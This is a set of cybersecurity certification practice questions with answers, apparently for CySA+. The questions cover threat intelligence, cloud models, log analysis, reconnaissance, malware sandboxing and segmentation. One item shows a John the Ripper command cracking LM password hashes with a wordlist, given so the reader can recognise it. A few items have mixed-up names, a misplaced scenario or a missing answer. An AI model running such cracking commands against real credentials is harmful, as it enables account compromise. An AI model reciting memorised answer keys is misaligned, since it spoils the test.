# Questions

1.  Olivia is considering potential sources for threat intelligence information that she might incorporate into her security program. Which one of the following sources is most likely to be available without a subscription fee?

    1. Vulnerability feeds
    2. Open source
    3. Closed source
    4. Proprietary

    Answer:

    B. Open-source intelligence is freely available information that does not require a subscription fee. Closed-source and proprietary intelligence are synonyms and do involve payments to the providers. Vulnerability feeds may be considered threat intelligence, but they normally come with subscription fees.
2.  Roger is evaluating threat intelligence information sources and finds that one source results in quite a few false positive alerts. This lowers his confidence level in the source. What criteria for intelligence is not being met by this source?

    1. Timeliness
    2. Expense
    3. Relevance
    4. Accuracy

    Answer:

    D. An intelligence source that results in false positive errors is lacking in accuracy because it is providing incorrect results to the organization. Those results may still be timely and relevant, but they are not correct. Expense is not one of the three intelligence criteria.
3.  Brad is working on a threat classification exercise, analyzing known threats and assessing the possibility of unknown threats. Which one of the following threat actors is most likely to be associated with an advanced persistent threat (APT)?

    1. Hacktivist
    2. Nation-state
    3. Insider
    4. Organized crime

    Answer:

    B. It is possible for any of these threat actors to be affiliated with an APT, but the highest likelihood is that a sophisticated APT threat would be associated with a nation-state, rather than a less-resourced alternative.
4.  What term is used to describe the groups of related organizations that pool resources to share cybersecurity threat information and analyses?

    1. SOC
    2. ISAC
    3. CERT
    4. CIRT

    Answer:

    B. The Department of Homeland Security collaborates with industry through information sharing and analysis centers (ISACs). These ISACs cover industries such as healthcare, financial, aviation, government, and critical infrastructure.
5.  Singh incorporated the Cisco Talos tool into his organization's threat intelligence program. He uses it to automatically look up information about the past activity of IP addresses sending email to his mail servers. What term best describes this intelligence source?

    1. Open source
    2. Behavioral
    3. Reputational
    4. Indicator of compromise

    Answer:

    C. This source provides information about IP addresses based on _past_ behavior. This makes it a reputational source. A behavioral source would look at information about _current_ behavior. This is a product offered by Cisco and is proprietary, not open source. It does not provide indicators that would help you determine whether your system had been compromised.
6.  Jamal is assessing the risk to his organization from their planned use of AWS Lambda, a serverless computing service that allows developers to write code and execute functions directly on the cloud platform. What cloud tier best describes this service?

    1. SaaS
    2. PaaS
    3. IaaS
    4. FaaS

    Answer:

    D. This is an example of function-as-a-service (FaaS) computing. A service like Lambda could also be described as platform-as-a-service (PaaS), because FaaS is a subset of PaaS. However, the term FaaS is the one that _best_ describes this service.
7.  Lauren's honeynet, shown here, is configured to use a segment of unused network space that has no legitimate servers in it. This design is particularly useful for detecting what types of threats?

    ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf001.jpg)

    1. Zero-day attacks
    2. SQL injection
    3. Network scans
    4. DDoS attacks

    Answer:

    C. Detection systems placed in otherwise unused network space will detect scans that blindly traverse IP address ranges. Since no public services are listed, attackers who scan this range can be presumed to be hostile and are often immediately blocked by security devices that protect production systems.
8.  Fred believes that the malware he is tracking uses a fast flux DNS network, which associates many IP addresses with a single fully qualified domain name as well as using multiple download hosts. How many distinct hosts should he review based on the NetFlow shown here?

    `Date flow start Duration Proto Src IP Addr:Port Dst IP Addr:Port Packets Bytes Flows 2020-07-11 14:39:30.606 0.448 TCP 192.168.2.1:1451->10.2.3.1:443 10 1510 12020-07-11 14:39:30.826 0.448 TCP 10.2.3.1:443->192.168.2.1:1451 7 360 1 2020-07-11 14:45:32.495 18.492 TCP 10.6.2.4:443->192.168.2.1:1496 5 1107 1 2020-07-11 14:45:32.255 18.888 TCP 192.168.2.1:1496->10.6.2.4:443 11 1840 1 2020-07-11 14:46:54.983 0.000 TCP 192.168.2.1:1496->10.6.2.4:443 1 49 1 2020-07-11 16:45:34.764 0.362 TCP 10.6.2.4:443->192.168.2.1:4292 4 1392 1 2020-07-11 16:45:37.516 0.676 TCP 192.168.2.1:4292->10.6.2.4:443 4 462 1 2020-07-11 16:46:38.028 0.000 TCP 192.168.2.1:4292->10.6.2.4:443 2 89 1 2020-07-11 14:45:23.811 0.454 TCP 192.168.2.1:1515->10.6.2.5:443 4 263 1 2020-07-11 14:45:28.879 1.638 TCP 192.168.2.1:1505->10.6.2.5:443 18 2932 1 2020-07-11 14:45:29.087 2.288 TCP 10.6.2.5:443->192.168.2.1:1505 37 48125 1 2020-07-11 14:45:54.027 0.224 TCP 10.6.2.5:443->192.168.2.1:1515 2 1256 1 2020-07-11 14:45:58.551 4.328 TCP 192.168.2.1:1525->10.6.2.5:443 10 648 1 2020-07-11 14:45:58.759 0.920 TCP 10.6.2.5:443->192.168.2.1:1525 12 15792 1 2020-07-11 14:46:32.227 14.796 TCP 192.168.2.1:1525->10.8.2.5:443 31 1700 1 2020-07-11 14:46:52.983 0.000 TCP 192.168.2.1:1505->10.8.2.5:443 1 40 1`

    1. 1
    2. 3
    3. 4
    4. 5

    Answer:

    C. This flow sample shows four distinct hosts being accessed from 192.168.2.1. They are 10.2.3.1, 10.6.2.4, 10.6.2.5, and 10.8.2.5.
9.  Which one of the following functions is not a common recipient of threat intelligence information?

    1. Legal counsel
    2. Risk management
    3. Security engineering
    4. Detection and monitoring

    Answer:

    A. Threat intelligence information is not commonly shared with legal counsel on a routine basis. CompTIA's CySA+ objectives list the following common recipients: incident response, vulnerability management, risk management, security engineering, and detection and monitoring.
10. Alfonzo is an IT professional at a Portuguese university who is creating a cloud environment for use only by other Portuguese universities. What type of cloud deployment model is he using?

    1. Public cloud
    2. Private cloud
    3. Hybrid cloud
    4. Community cloud

    Answer:

    D. Community clouds are cloud computing environments available only to members of a collaborative community, such as a set of universities. Public clouds are available to any customers who want to use them. Private clouds are for the use of the organization building the cloud only. Hybrid clouds mix elements of public and private clouds in an enterprise computing strategy.
11. As a member of a blue team, Lukas observed the following behavior during an external penetration test. What should he report to his managers at the conclusion of the test?

    ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf002.jpg)

    1. A significant increase in latency.
    2. A significant increase in packet loss.
    3. Latency and packet loss both increased.
    4. No significant issues were observed.

    Answer:

    D. This chart shows typical latency for a remote system and minimal or at times zero packet loss. This chart shows normal operations, and Lukas can safely report no visible issues.
12. The company that Maria works for is making significant investments in infrastructure-as-a-service hosting to replace its traditional datacenter. Members of her organization's management have Maria's concerns about data remanence when Lauren's team moves from one virtual host to another in their cloud service provider's environment. What should she instruct her team to do to avoid this concern?

    1. Zero-wipe drives before moving systems.
    2. Use full-disk encryption.
    3. Use data masking.
    4. Span multiple virtual disks to fragment data.

    Answer:

    B. Maria's team should use full-disk encryption or volume encryption and should secure the encryption keys properly. This will ensure that any data that remains cannot be exposed to future users of the virtual infrastructure. Although many cloud providers have implemented technology to ensure that this won't happen, Maria can avoid any potential issues by ensuring that she has taken proactive action to prevent data exposure. Using a zero-wipe is often impossible because virtual environments may move without her team's intervention, data masking will not prevent unmasked data or temporary data stored on the virtual disks from being exposed, and spanning multiple virtual disks will still leave data accessible, albeit possibly in fragmented form.
13. Geoff is reviewing logs and sees a large number of attempts to authenticate to his VPN server using many different username and password combinations. The same usernames are attempted several hundred times before moving on to the next one. What type of attack is most likely taking place?

    1. Credential stuffing
    2. Password spraying
    3. Brute-force
    4. Rainbow table

    Answer:

    B. In a password spraying attack, the attacker tries a set of common passwords using many different accounts. The activity Geoff sees is consistent with this type of attack. Credential stuffing attacks seek to use username/password lists stolen from another site to log on to a different site. This would result in only one login attempt per username. Brute-force attacks would result in thousands or millions of attempts per username. Rainbow table attacks take place offline and would not be reflected in the logs.
14. Kaiden is configuring a SIEM service in his IaaS cloud environment that will receive all of the log entries generated by other devices in that environment. Which one of the following risks is greatest with this approach in the event of a DoS attack or other outage?

    1. Inability to access logs
    2. Insufficient logging
    3. Insufficient monitoring
    4. Insecure API

    Answer:

    A. The greatest risk in the event of a DoS attack is that the logs are stored in the same cloud environment that is under attack. Cybersecurity professionals may not be able to access those logs to investigate the incident.
15. Azra believes that one of her users may be taking malicious action on the systems she has access to. When she walks past the user's desktop, she sees the following command on the screen:

    `user12@workstation:/home/user12# ./john -wordfile:/home/user12/mylist.txt -format:lm hash.txt`

    What is the user attempting to do?

    1. They are attempting to hash a file.
    2. They are attempting to crack hashed passwords.
    3. They are attempting to crack encrypted passwords.
    4. They are attempting a pass-the-hash attack.

    Answer:

    B. Azra's suspicious user appears to be attempting to crack LANMAN hashes using a custom word list. The key clues here are the `john` application, the LM hash type, and the location of the word list.
16. Lucas believes that an attacker has successfully compromised his web server. Using the following output of `ps`, identify the process ID he should focus on:

    `root 507 0.0 0.1 258268 3288 ? Ssl 15:52 0:00 /usr/sbin/rsyslogd -n message+ 508 0.0 0.2 44176 5160 ? Ss 15:52 0:00 /usr/bin/dbusdaemon --system --address=systemd: --nofork --nopidfile --systemd-activaroot 523 0.0 0.3 281092 6312 ? Ssl 15:52 0:00 /usr/lib/accountsservice/accounts-daemon root 524 0.0 0.7 389760 15956 ? Ssl 15:52 0:00 /usr/sbin/NetworkManager --no-daemon root 527 0.0 0.1 28432 2992 ? Ss 15:52 0:00 /lib/systemd/systemd-logind apache 714 0.0 0.1 27416 2748 ? Ss 15:52 0:00 /www/temp/webmin root 617 0.0 0.1 19312 2056 ? Ss 15:52 0:00 /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid root 644 0.0 0.1 245472 2444 ? Sl 15:52 0:01 /usr/sbin/VBoxService root 653 0.0 0.0 12828 1848 tty1 Ss+ 15:52 0:00 /sbin/agetty --noclear tty1 linux root 661 0.0 0.3 285428 8088 ? Ssl 15:52 0:00 /usr/lib/policykit-1/polkitd --no-debug root 663 0.0 0.3 364752 7600 ? Ssl 15:52 0:00 /usr/sbin/gdm3 root 846 0.0 0.5 285816 10884 ? Ssl 15:53 0:00 /usr/lib/upower/upowerd root 867 0.0 0.3 235180 7272 ? Sl 15:53 0:00 gdm-session-worker [pam/gdm-launch-environment] Debian-+ 877 0.0 0.2 46892 4816 ? Ss 15:53 0:00 /lib/systemd/systemd --user Debian-+ 878 0.0 0.0 62672 1596 ? S 15:53 0:00 (sd-pam)`

    1. 508
    2. 617
    3. 846
    4. 714

    Answer:

    D. The service running from the `www` directory as the user `apache` should be an immediate indication of something strange, and the use of `webmin` from that directory should also be a strong indicator of something wrong. Lucas should focus on the web server for the point of entry to the system and should review any files that the Apache user has created or modified. If local vulnerabilities existed when this compromise occurred, the attacker may have already escalated to another account!
17. Geoff is responsible for hardening systems on his network and discovers that a number of network appliances have exposed services, including telnet, FTP, and web servers. What is his best option to secure these systems?

    1. Enable host firewalls.
    2. Install patches for those services.
    3. Turn off the services for each appliance.
    4. Place a network firewall between the devices and the rest of the network.

    Answer:

    D. Geoff's only sure bet to prevent these services from being accessed is to put a network firewall in front of them. Many appliances enable services by default; since they are appliances, they may not have host firewalls available to enable. They also often don't have patches available, and many appliances do not allow the services they provide to be disabled or modified.
18. While conducting reconnaissance of his own organization, Ian discovers that multiple certificates are self-signed. What issue should he report to his management?

    1. Self-signed certificates do not provide secure encryption for site visitors.
    2. Self-signed certificates can be revoked only by the original creator.
    3. Self-signed certificates will cause warnings or error messages.
    4. None of the above.

    Answer:

    C. Using self-signed certificates for services that will be used by the general public or organizational users outside of a small testing group can be an issue because they will result in an error or warning in most browsers. The TLS encryption used for HTTPS will remain just as strong regardless of whether the certificate is provided by a certificate authority or self-signed, and a self-signed certificate cannot be revoked at all.
19. Brandon wants to perform a WHOIS query for a system he believes is located in Europe. Which NIC should he select to have the greatest likelihood of success for his query?

    1. AFRINIC
    2. APNIC
    3. RIPE
    4. LACNIC

    Answer:

    C. Brandon should select RIPE, the regional Internet registry for Europe, the Middle East, and parts of Central Asia. AFRINIC serves Africa, APNIC serves the Asia/Pacific region, and LACNIC serves Latin America and the Caribbean.
20. While reviewing Apache logs, Janet sees the following entries as well as hundreds of others from the same source IP address. What should Janet report has occurred?

    `[ 21/Jul/2020:02:18:33 -0500] - - 10.0.1.1 "GET /scripts/sample.php" "-" 302 336 0 [ 21/Jul/2020:02:18:35 -0500] - - 10.0.1.1 "GET /scripts/test.php" "-" 302 336 0 [ 21/Jul/2020:02:18:37 -0500] - - 10.0.1.1 "GET /scripts/manage.php" "-" 302 336 0 [ 21/Jul/2020:02:18:38 -0500] - - 10.0.1.1 "GET /scripts/download.php" "-" 302 336 0 [ 21/Jul/2020:02:18:40 -0500] - - 10.0.1.1 "GET /scripts/update.php" "-" 302 336 0 [ 21/Jul/2020:02:18:42 -0500] - - 10.0.1.1 "GET /scripts/new.php" "-" 302 336 0`

    1. A denial-of-service attack
    2. A vulnerability scan
    3. A port scan
    4. A directory traversal attack

    Answer:

    B. Testing for common sample and default files is a common tactic for vulnerability scanners. Janet can reasonably presume that her Apache web server was scanned using a vulnerability scanner.
21. Scott is part of the white team that is overseeing his organization's internal red and blue teams during an exercise that requires each team to only perform actions appropriate to the penetration test phase they are in. During the reconnaissance phase, he notes the following behavior as part of a Wireshark capture. What should he report?

    ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf003.jpg)

    1. The blue team has succeeded.
    2. The red team is violating the rules of engagement.
    3. The red team has succeeded.
    4. The blue team is violating the rules of engagement.

    Answer:

    B. This capture shows SQL injection attacks being attempted. We can determine this from the SQL keywords (e.g., `UNION ALL`) that appear in packets 2188 and 2196. Since this is the reconnaissance phase, the red team should not be actively attempting to exploit vulnerabilities and has violated the rules of engagement.
22. Jennifer analyzes a Wireshark packet capture from a network that she is unfamiliar with. She discovers that a host with IP address 10.11.140.13 is running services on TCP ports 636 and 443. What services is that system most likely running?

    1. LDAPS and HTTPS
    2. FTPS and HTTPS
    3. RDP and HTTPS
    4. HTTP and Secure DNS

    Answer:

    A. TCP port 636 is often used for secure LDAP, and secure HTTP typically uses TCP 443. Although other services could use these ports, Jennifer's best bet is to presume that they will be providing the services they are typically associated with.
23. While tracking a potential APT on her network, Cynthia discovers a network flow for her company's central file server. What does this flow entry most likely show if 10.2.2.3 is not a system on her network?

    `Date flow start Duration Proto Src IP Addr:Port Dst IP Addr:Port Packets Bytes Flows 2017-07-11 13:06:46.343 21601804 TCP 10.1.1.1:1151->10.2.2.3:443 9473640 9.1 G 1 2017-07-11 13:06:46.551 21601804 TCP 10.2.2.3:443->10.1.1.1:1151 8345101 514 M 1`

    1. A web browsing session
    2. Data exfiltration
    3. Data infiltration
    4. A vulnerability scan

    Answer:

    B. Large data flows leaving an organization's network may be a sign of data exfiltration by an advanced persistent threat. Using HTTPS to protect the data while making it look less suspicious is a common technique.
24. During a regularly scheduled PCI compliance scan, Fred has discovered port 3389 open on one of the point-of-sale terminals that he is responsible for managing. What service should he expect to find enabled on the system?

    1. MySQL
    2. RDP
    3. TOR
    4. Jabber

    Answer:

    B. Port 3389 is the service port for RDP. If Fred doesn't expect this port to be open on his point-of-sale terminals, he should immediately activate his incident response plan.
25. Saanvi knows that the organization she is scanning runs services on alternate ports to attempt to reduce scans of default ports. As part of her intelligence-gathering process, she discovers services running on ports 8080 and 8443. What services are most likely running on these ports?

    1. Botnet C\&C
    2. Nginx
    3. Microsoft SQL Server instances
    4. Web servers

    Answer:

    D. Many system administrators have historically chosen 8080 and 8443 as the alternate service ports for plain-text and secure web services. Although these ports could be used for any service, it would be reasonable for Saanvi to guess that a pair of services with ports like these belongs to web servers.
26. Kwame is reviewing his team's work as part of a reconnaissance effort and is checking Wireshark packet captures. His team reported no open ports on 10.0.2.15. What issue should he identify with their scan based on the capture shown here?

    ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf004.jpg)

    1. The host was not up.
    2. Not all ports were scanned.
    3. The scan scanned only UDP ports.
    4. The scan was not run as root.

    Answer:

    C. This scan shows only UDP ports. Since most services run as TCP services, this scan wouldn't have identified most common servers. Kwame should review the commands that his team issued as part of their exercise. If he finds that Nmap was run with an `-sU` flag, he will have found the issue.
27. Angela wants to gather network traffic from systems on her network. What tool can she use to best achieve this goal?

    1. Nmap
    2. Wireshark
    3. Sharkbait
    4. Dradis

    Answer:

    B. Angela can use Wireshark, a tool that can capture network traffic using a graphical user interface to meet this objective. Nmap is a tool used to perform port scans. Dradis is an open-source collaboration platform for security teams, and Sharkbait is not a security tool or term.
28. Wang submits a suspected malware file to `malwr.com` and receives the following information about its behavior. What type of tool is `malwr.com`?

    ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf005.jpg)

    1. A reverse-engineering tool
    2. A static analysis sandbox
    3. A dynamic analysis sandbox
    4. A decompiler sandbox

    Answer:

    C. Wang's screenshot shows behavioral analysis of the executed code. From this, you can determine that `malwr` is a dynamic analysis sandbox that runs the malware sample to determine what it does while also analyzing the file.
29. Which sources are most commonly used to gather information about technologies a target organization uses during intelligence gathering?

    1. OSINT searches of support forums and social engineering
    2. Port scanning and social engineering
    3. Social media review and document metadata
    4. Social engineering and document metadata

    Answer:

    A. Since organizations often protect information about the technologies they use, OSINT searches of support forums and social engineering are often combined to gather information about the technologies they have in place. Port scanning will typically not provide detailed information about services and technologies. Social media review may provide some hints, but document metadata does not provide much information about specific technologies relevant to a penetration test or attack.
30. Sarah has been asked to assess the technical impact of suspected reconnaissance performed against her organization. She is informed that a reliable source has discovered that a third party has been performing reconnaissance by querying WHOIS data. How should Sarah categorize the technical impact of this type of reconnaissance?

    1. High.
    2. Medium.
    3. Low.
    4. She cannot determine this from the information given.

    Answer:

    C. Sarah knows that domain registration information is publicly available and that her organization controls the data that is published. Since this does not expose anything that she should not expect to be accessible, she should categorize this as a low impact.
31. Rick is reviewing flows of a system on his network and discovers the following flow logs. What is the system doing?

    `ICMP "Echo request" Date flow start Duration Proto Src IP Addr:Port->Dst IP Addr:Port Packets Bytes Flows 2019-07-11 04:58:59.518 10.000 ICMP 10.1.1.1:0->10.2.2.6:8.0 11 924 12019-07-11 04:58:59.518 10.000 ICMP 10.2.2.6:0->10.1.1.1:0.0 11 924 1 2019-07-11 04:58:59.518 10.000 ICMP 10.1.1.1:0->10.2.2.7:8.0 11 924 1 2019-07-11 04:58:59.518 10.000 ICMP 10.2.2.7:0->10.1.1.1:0.0 11 924 1 2019-07-11 04:58:59.518 10.000 ICMP 10.1.1.1:0->10.2.2.8:8.0 11 924 1 2019-07-11 04:58:59.518 10.000 ICMP 10.2.2.8:0->10.1.1.1:0.0 11 924 1 2019-07-11 04:58:59.518 10.000 ICMP 10.1.1.1:0->10.2.2.9:8.0 11 924 1 2019-07-11 04:58:59.518 10.000 ICMP 10.2.2.9:0->10.1.1.1:0.0 11 924 1 2019-07-11 04:58:59.518 10.000 ICMP 10.1.1.1:0->10.2.2.10:8.0 11 924 1 2019-07-11 04:58:59.518 10.000 ICMP 10.2.2.10:0->10.1.1.1:0.0 11 924 1 2019-07-11 04:58:59.518 10.000 ICMP 10.1.1.1:0->10.2.2.6:11.0 11 924 1 2019-07-11 04:58:59.518 10.000 ICMP 10.2.2.11:0->10.1.1.1:0.0 11 924 1`

    1. A port scan
    2. A failed three-way handshake
    3. A ping sweep
    4. A traceroute

    Answer:

    C. The increasing digit of the IP address of the target system (.6, .7, .8) and the ICMP protocol echo request indicate that this is a ping sweep. This could be part of a port scan, but the only behavior that is shown here is the ping sweep. This is ICMP and cannot be a three-way handshake, and a traceroute would follow a path rather than a series of IP addresses.
32. Ryan's passive reconnaissance efforts resulted in the following packet capture. Which of the following statements cannot be verified based on the packet capture shown for the host with IP address 10.0.2.4?

    ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf005a.jpg)

    1. The host does not have a DNS entry.
    2. It is running a service on port 139.
    3. It is running a service on port 445.
    4. It is a Windows system.

    Answer:

    D. While the system responded on common Windows ports, you cannot determine whether it is a Windows system. It did respond, and both ports 139 and 445 were accessible. When the host Wireshark capture was conducted from queried DNS, it did not receive a response, indicating that the system does not have a DNS entry (or at least, it doesn't have one that is available to the host that did the scan and ran the Wireshark capture).
33. Kevin is concerned that an employee of his organization might fall victim to a phishing attack and wants to redesign his social engineering awareness program. What type of threat is he most directly addressing?

    1. Nation-state
    2. Hacktivist
    3. Unintentional insider
    4. Intentional insider

    Answer:

    C. By conducting awareness training, Kevin is seeking to educate insiders about the risks posed by phishing attacks. Specifically, he is seeking to prevent an insider from unintentionally posing a risk to the organization by falling victim to a phishing attack.
34. What purpose does a honeypot system serve when placed on a network as shown in the following diagram?

    ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf006.jpg)

    1. It prevents attackers from targeting production servers.
    2. It provides information about the techniques attackers are using.
    3. It slows down attackers like sticky honey.
    4. It provides real-time input to IDSs and IPSs.

    Answer:

    B. A honeypot is used by security researchers and practitioners to gather information about techniques and tools used by attackers. A honeypot will not prevent attackers from targeting other systems, and unlike a tarpit, it is not designed to slow down attackers. Typically, honeypot data must be analyzed to provide useful information that can be used to build IDS and IPS rules.
35. A tarpit, or a system that looks vulnerable but actually is intended to slow down attackers, is an example of what type of technique?

    1. A passive defense
    2. A sticky defense
    3. An active defense
    4. A reaction-based defense

    Answer:

    C. Tarpits are a form of active defense that decoy or bait attackers. Passive defenses include cryptography, security architecture, and similar options. Sticky defenses and reaction-based defenses were made up for this question.
36. Susan needs to test thousands of submitted binaries. She needs to ensure that the applications do not contain malicious code. What technique is best suited to this need?

    1. Sandboxing
    2. Implementing a honeypot
    3. Decompiling and analyzing the application code
    4. Fagan testing

    Answer:

    A. Susan's best option is to use an automated testing sandbox that analyzes the applications for malicious or questionable behavior. Although this may not catch every instance of malicious software, the only other viable option is decompiling the applications and analyzing the code, which would be incredibly time-consuming. Since she doesn't have the source code, Fagan inspection won't work (and would take a long time too), and running a honeypot is used to understand hacker techniques, not to directly analyze application code.
37. Manesh downloads a new security tool and checks its MD5. What does she know about the software she downloaded if she receives the following message?

    `root@demo:~# md5sum -c demo.md5 demo.txt: FAILED md5sum: WARNING: 1 computed checksum did NOT match`

    1. The file has been corrupted.
    2. Attackers have modified the file.
    3. The files do not match.
    4. The test failed and provided no answer.

    Answer:

    C. Manesh knows that the file she downloaded and computed a checksum for does not match the MD5 checksum that was calculated by the providers of the software. She does not know if the file has been corrupted or if attackers have modified the file, but she may want to contact the providers of the software to let them know about the issue—and she definitely shouldn't execute or trust the file!
38. Aziz needs to provide SSH access to systems behind his datacenter firewall. If Aziz's organization uses the system architecture shown here, what is the system at point A called?

    ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf007.jpg)

    1. A firewall-hopper
    2. An isolated system
    3. A moat-protected host
    4. A jump box

    Answer:

    D. Aziz is using a jump box to provide access. A jump box, sometimes called a _jump server_ or _secure administrative host_, is a system used to manage devices in a separate, typically higher, security zone. This prevents administrators from using a less secure administrative workstation in the high-security zone.
39. During his analysis of a malware sample, Sahib reviews the malware files and binaries without running them. What type of analysis is this?

    1. Automated analysis
    2. Dynamic analysis
    3. Static analysis
    4. Heuristic analysis

    Answer:

    C. Sahib is performing static analysis, which is analysis performed without running code. He can use tools or manually review the code (and, in fact, is likely to do both).
40. Carol wants to analyze a malware sample that she has discovered. She wants to run the sample safely while capturing information about its behavior and impact on the system it infects. What type of tool should she use?

    1. A static code analysis tool
    2. A dynamic analysis sandbox tool
    3. A Fagan sandbox
    4. A decompiler running on an isolated VM

    Answer:

    B. Since Carol wants to analyze a program as it runs, you know she needs a dynamic code analysis tool. With the added safety requirement, a sandbox is also needed. Static code analysis looks at source code, no mention is made of decompiling or reverse engineering the code, and Fagan inspection is a formal code analysis process.
41. Susan is reviewing files on a Windows workstation and believes that `cmd.exe` has been replaced with a malware package. Which of the following is the best way to validate her theory?

    1. Submit `cmd.exe` to VirusTotal.
    2. Compare the hash of `cmd.exe` to a known good version.
    3. Check the file using the National Software Reference Library.
    4. Run `cmd.exe` to make sure its behavior is normal.

    Answer:

    A. Susan's best option is to submit the file to a tool like VirusTotal that will scan it for virus-like behaviors and known malware tools. Checking the hash either by using a manual check or by using the National Software Reference Library can tell her if the file matches a known good version but won't tell her if it includes malware. Running a suspect file is the worst option on the list.
42. Nishi is deploying a new application that will process sensitive health information about her organization's clients. To protect this information, the organization is building a new network that does not share any hardware or logical access credentials with the organization's existing network. What approach is Nishi adopting?

    1. Network interconnection
    2. Network segmentation
    3. Virtual LAN (VLAN) isolation
    4. Virtual private network (VPN)

    Answer:

    B. The strategy outlined by Nishi is one of network segmentation—placing separate functions on separate networks. She is explicitly not interconnecting the two networks. VPNs and VLANs are also technologies that could assist with the goal of protecting sensitive information, but they use shared hardware and would not necessarily achieve the level of isolation that Nishi requires.
43. Bobbi is deploying a single system that will be used to manage a sensitive industrial control process. This system will operate in a stand-alone fashion and not have any connection to other networks. What strategy is Bobbi deploying to protect this SCADA system?

    1. Network segmentation
    2. VLAN isolation
    3. Airgapping
    4. Logical isolation

    Answer:

    C. Bobbi is adopting a physical, not logical, isolation strategy. In this approach, known as _air-gapping_, the organization uses a stand-alone system for the sensitive function that is not connected to any other system or network, greatly reducing the risk of compromise. VLAN isolation and network segmentation involve a degree of interconnection that is not present in this scenario.
44. Geoff has been asked to identify a technical solution that will reduce the risk of captured or stolen passwords being used to allow access to his organization's systems. Which of the following technologies should he recommend?

    1. Captive portals
    2. Multifactor authentication
    3. VPNs
    4. OAuth

    Answer:

    B. Multifactor authentication helps reduce the risk of a captured or stolen password by requiring more than one factor to authenticate. Attackers are less likely to have also stolen a token, code, or biometric factor. A captive portal is used to authenticate users for guest networks or similar purposes. Virtual private networks (VPNs) are used to provide a private network connection that can make a local network act like it is part of a remote network. OAuth is an open protocol for secure authorization.
45. The company that Amanda works for is making significant investments in infrastructure-as-a-service hosting to replace their traditional datacenter. Members of her organization's management have expressed concerns about data remanence when Amanda's team moves from one virtual host to another in their cloud service provider's environment. What should she instruct her team to do to avoid this concern?

    1. Perform zero-wipe drives before moving systems.
    2. Use full-disk encryption.
    3. Use data masking.
    4. Span multiple virtual disks to fragment data.

    Answer:

    B. Amanda's team should use full-disk encryption or volume encryption and should secure the encryption keys properly. This will ensure that any data that remains cannot be exposed to future users of the virtual infrastructure. Although many cloud providers have implemented technology to ensure that this won't happen, Amanda can avoid any potential issues by ensuring that she has taken proactive action to prevent data exposure. Using a zero wipe is often impossible because virtual environments may move without her team's intervention, data masking will not prevent unmasked data or temporary data stored on the virtual disks from being exposed, and spanning multiple virtual disks will still leave data accessible, albeit possibly in fragmented form.
46. Which one of the following technologies is _not_ typically used to implement network segmentation?

    1. Host firewall
    2. Network firewall
    3. VLAN tagging
    4. Routers and switches

    Answer:

    A. Host firewalls operate at the individual system level and, therefore, cannot be used to implement network segmentation. Routers and switches may be used for this purpose by either physically separating networks or implementing VLAN tagging. Network firewalls may also be used to segment networks into different zones.
47. Ian has been asked to deploy a secure wireless network in parallel with a public wireless network inside his organization's buildings. What type of segmentation should he implement to do so without adding additional costs and complexity?

    1. SSID segmentation
    2. Logical segmentation
    3. Physical segmentation
    4. WPA segmentation

    Answer:

    B. Ian knows that deploying multiple access points in the same space to deploy a physically segmented wireless network would significantly increase both the costs of deployment and the complexity of the network due to access points causing conflicts. His best choice is to logically segment his networks using one set of access points. SSID and WPA segmentation are both made-up terms for this question.
48. Barbara has segmented her virtualized servers using VMware to ensure that the networks remain secure and isolated. What type of attack could defeat her security design?

    1. VLAN hopping
    2. 802.1q trunking vulnerabilities
    3. Compromise of the underlying VMware host
    4. BGP route spoofing

    Answer:

    C. Barbara should be most concerned about compromise of the underlying VMware host as a threat model for her virtual segmentation. VLAN hopping (typically done via 802.1q trunking attacks) requires trunking to be turned on, which is unlikely in a virtualized environment like this. Border Gateway Protocol (BGP) route spoofing occurs at the router level and is once again unlikely to be a threat in a VMware environment.

    You may not always know all the technologies in a question like this, so when you prepare for the exam, you should consider what you do know when you run into this type of question. Here, you might note that relying on the underlying host for virtualization means that a compromise of the system would allow attackers to overcome the segmentation that is acting to protect them.
49. What major issue would Charles face if he relied on hashing malware packages to identify malware packages?

    1. Hashing can be spoofed.
    2. Collisions can result in false positives.
    3. Hashing cannot identify unknown malware.
    4. Hashing relies on unencrypted malware samples.

    Answer:

    C. Relying on hashing means that Charles will be able to identify only the specific versions of malware packages that have already been identified. This is a consistent problem with signature-based detections, and malware packages commonly implement polymorphic capabilities that mean that two instances of the same package will not have identical hashes due to changes meant to avoid signature-based detection systems.
50. Noriko wants to ensure that attackers cannot access his organization's building automation control network. Which of the following segmentation options provides the strongest level of assurance that this will not happen?

    1. Air gap
    2. VLANs
    3. Network firewalls
    4. Host firewalls

    Use the following scenario for questions 51–53.

    Angela is a security practitioner at a midsize company that recently experienced a serious breach due to a successful phishing attack. The company has committed to changing its security practices across the organization and has assigned Angela to determine the best strategy to make major changes that will have a significant impact right away.

    Answer:

    A. An air gap, or complete physical isolation, provides the strongest control available on the list provided. To traverse an air gap, one of Noriko's staff would need to physically copy files via a removable drive or would need to plug a device into the air-gapped network.
51. Angela's company has relied on passwords as its authentication factor for years. The current organizational standard is to require an eight-character, complex password and to require a password change every 12 months. What recommendation should Angela make to significantly decrease the likelihood of a similar phishing attack and breach in the future?

    1. Increase the password length.
    2. Shorten the password lifespan.
    3. Deploy multifactor authentication.
    4. Add a PIN to all logins.

    Answer:

    C. Using a multifactor solution will significantly decrease the likelihood of a successful phishing attack resulting in an attacker having both factors for any given user. Although deploying multifactor can be complex, it is the most impactful of the options listed. Both password lifespan and length modifications will not change what happens when users accidentally disclose their current password as part of a phishing attack, and a PIN can also be disclosed.
52. Angela has decided to roll out a multifactor authentication system. What are the two most common factors used in MFA systems?

    1. Location and knowledge
    2. Knowledge and possession
    3. Knowledge and biometric
    4. Knowledge and location

    Answer:

